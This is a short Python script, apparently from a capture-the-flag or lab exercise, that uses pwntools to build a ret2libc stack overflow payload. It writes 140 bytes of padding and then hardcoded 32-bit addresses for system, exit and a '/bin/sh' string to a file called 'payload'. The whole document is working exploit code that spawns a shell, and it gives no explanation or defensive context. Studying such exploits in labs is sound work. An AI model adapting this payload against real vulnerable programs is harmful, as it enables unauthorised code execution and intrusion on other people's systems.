from pwn import p32

payload  = b"A" * 140
payload += p32(0xb7e6b060)  # system
payload += p32(0xb7e5ebe0)  # exit
payload += p32(0xb7f8cc58)  # /bin/sh

with open("payload", "wb") as f:
    f.write(payload)